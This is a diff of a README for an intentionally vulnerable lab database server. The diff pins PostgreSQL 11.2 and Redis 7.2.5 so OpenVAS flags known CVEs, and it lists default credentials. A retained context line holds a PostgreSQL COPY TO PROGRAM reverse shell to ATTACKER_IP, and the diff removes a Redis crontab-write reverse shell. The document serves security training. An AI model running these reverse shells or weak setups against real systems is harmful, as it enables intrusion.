@@ -2,21 +2,52 @@
 
 > ⚠️ **FOR EDUCATIONAL / LAB USE ONLY — NEVER EXPOSE TO THE INTERNET**
 
-Machine 4 is a critical database server in the **Restricted Zone (`172.16.0.10`)** hosting **MySQL 8 (root/toor)**, **PostgreSQL 16 (COPY PROGRAM RCE)**, and **Redis (No Auth, RCE via Cron)** with sensitive PII and lateral movement credentials.
+Deploy target: **192.168.10.101**. The compose file publishes every port on `0.0.0.0`, so no IP edit is required.
+
+Services OpenVAS can match on this host:
+
+| CVE | Service | Port | Version the check matches |
+| --- | --- | --- | --- |
+| CVE-2019-9193 | PostgreSQL | 5432 | **11.2** (range 9.3–11.2) |
+| CVE-2024-31449 | Redis | 6379 | **7.2.5** (range 7.2.0–7.2.5) |
+
+MySQL and SSH are the Ubuntu image. PostgreSQL and Redis are separate pinned images. Copy `.env.example` to `.env` and set the passwords there before `docker compose up`. SSH is published on host port **2222**.
 
 ---
 
-## 🚀 Quick Start (One-Command Deploy)
+## Deploy on 192.168.10.101
 
-Run this on your **Ubuntu 24 VM** (`172.16.0.10`):
+Copy `machines/rz-db01` to the host as `/opt/rz-db01`. The lab hosts so far are Ubuntu 24.04. Install Docker with `sudo`, then start the stack.
 
 ```bash
-git clone https://github.com/YOUR_GITHUB_USERNAME/webserver.git
-cd webserver/machines/rz-db01
+sudo apt-get update
+sudo apt-get install -y ca-certificates curl
+sudo install -m 0755 -d /etc/apt/keyrings
+sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
+sudo chmod a+r /etc/apt/keyrings/docker.asc
+echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu noble stable" | sudo tee /etc/apt/sources.list.d/docker.list
+sudo apt-get update
+sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
+sudo systemctl enable --now docker
 
-chmod +x deploy.sh
-sudo ./deploy.sh
+cd /opt/rz-db01
+cp .env.example .env
+# edit .env, then:
+sudo docker compose up -d --build
+sudo docker compose ps
 ```
+
+If an older PostgreSQL container is already bound to port 5432, remove it before the compose start. Ubuntu’s own PostgreSQL 16 package will not match CVE-2019-9193.
+
+## Verify
+
+```bash
+sudo docker inspect -f '{{.State.Health.Status}}' vulncorp-postgres vulncorp-redis
+sudo docker exec vulncorp-postgres psql -U vulncorp_user -d vulncorp_prod -c 'select version();'
+sudo docker exec vulncorp-redis redis-cli INFO server | head
+```
+
+Expected banners: PostgreSQL **11.2** and `redis_version:7.2.5`. Scan **192.168.10.101** ports **5432** and **6379** with OpenVAS **Full and fast** and an updated Community feed.
 
 ---
 
@@ -25,8 +56,8 @@ sudo ./deploy.sh
 | Service | Port | Vulnerability |
 |---------|------|---------------|
 | **MySQL** | `3306` | Default root credentials (`root` / `toor`), bound to `0.0.0.0`, PII stored in plaintext |
-| **PostgreSQL** | `5432` | Superuser `vulncorp_user` (`vulncorp123`), `COPY ... TO PROGRAM` enables direct RCE |
-| **Redis** | `6379` | **No Password Required** (`requirepass` disabled), `protected-mode no`, writable crontab RCE |
+| **PostgreSQL** | `5432` | Upstream **11.2**, superuser `vulncorp_user` / `vulncorp123`. Last build in the CVE-2019-9193 range OpenVAS matches (9.3 through 11.2) |
+| **Redis** | `6379` | Upstream **7.2.5** (no password, `protected-mode no`). In the CVE-2024-31449 range OpenVAS matches (fixed in 7.2.6) |
 | **SSH** | `22` | OpenSSH root login allowed |
 
 ---
@@ -50,14 +81,9 @@ psql -h 172.16.0.10 -U vulncorp_user -d vulncorp_prod
 COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1';
 ```
 
-### 3. Redis RCE via Crontab Write
-```bash
-redis-cli -h 172.16.0.10
-CONFIG SET dir /var/spool/cron/crontabs
-CONFIG SET dbfilename root
-SET payload "\n\n* * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n"
-BGSAVE
-```
+### 3. Redis CVE-2024-31449
+
+The Redis service is `vulncorp-redis` (`redis:7.2.5`) on **192.168.10.101:6379**. `requirepass` is empty and `protected-mode` is off. OpenVAS matches this banner in the 7.2.0–7.2.5 range (fixed in 7.2.6). CVE-2024-31449 is an authenticated Lua bug, not a crontab write. A default top-1000 port scan can skip 6379, so include that port in the scan.
 
 ---
 
